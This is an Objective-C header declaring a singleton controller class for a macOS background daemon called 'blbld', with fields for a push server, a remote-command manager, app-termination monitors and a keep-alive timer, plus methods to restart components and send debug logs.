//
//  blblwController.h
//  blbld
//
//  Created by Makara Khloth on 10/12/16.
//
//

#import <Foundation/Foundation.h>

@class RCManager,MacInfoImp,AppTerminateMonitor;

@interface blblwController : NSObject {
@private
    NSString *_pushServerUrl;
    int _pushServerPort;
    
    MacInfoImp *_macInfo;
    RCManager *_rcm;
    AppTerminateMonitor *_blbluMonitor;
    AppTerminateMonitor *_kblsMonitor;
    
    NSTimer *_keepAiveTimer;
}

+ (instancetype) sharedblblwController;

@property (nonatomic, retain) NSArray *launchArgs;
@property (nonatomic, readonly) AppTerminateMonitor *blbluMonitor;
@property (nonatomic, readonly) AppTerminateMonitor *kblsMonitor;

- (void) restartAll;
- (void) sendDebugLogToRecipients: (NSArray *) recipients;

@end
